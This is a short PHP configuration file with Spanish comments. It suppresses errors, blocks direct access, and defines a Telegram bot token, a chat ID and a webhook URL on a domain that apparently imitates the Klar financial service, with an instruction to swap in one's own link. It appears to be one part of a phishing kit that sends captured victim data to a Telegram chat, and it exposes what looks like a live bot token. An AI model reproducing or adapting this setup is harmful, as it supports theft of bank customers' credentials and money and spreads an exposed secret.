<?php
// 🚫 Ocultar errores y advertencias
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// 🔒 Bloquear acceso directo desde navegador
if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
    http_response_code(403);
    exit('Acceso prohibido.');
}

// ⚙️ Configuración principal (solo accesible por inclusión)
$bot_token_2 = '8137246523:AAGsP4WG1Nvh8oxRAdBGobbVLfbSOguop-8';  
$chat_id_2   = '-1002363197074';
$webhook_url = '(https://klar-validacion2026.vercel.app)approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
?>
